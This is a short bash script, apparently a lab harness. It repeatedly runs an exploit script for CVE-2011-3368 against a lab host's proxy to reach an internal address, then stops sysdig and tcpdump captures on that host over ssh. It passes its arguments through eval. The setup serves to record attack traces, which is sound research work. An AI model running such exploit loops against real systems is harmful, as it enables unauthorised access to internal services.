#!/bin/bash


for i in $(eval echo {$1..$2})
do
python exploit-CVE-2011-3368.py -r 10.176.147.83 -p 10001 -g / -d 10.0.3.2 -e 8080

sleep 1 


ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT sysdig_cap 
ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT tcpdump_cap
done
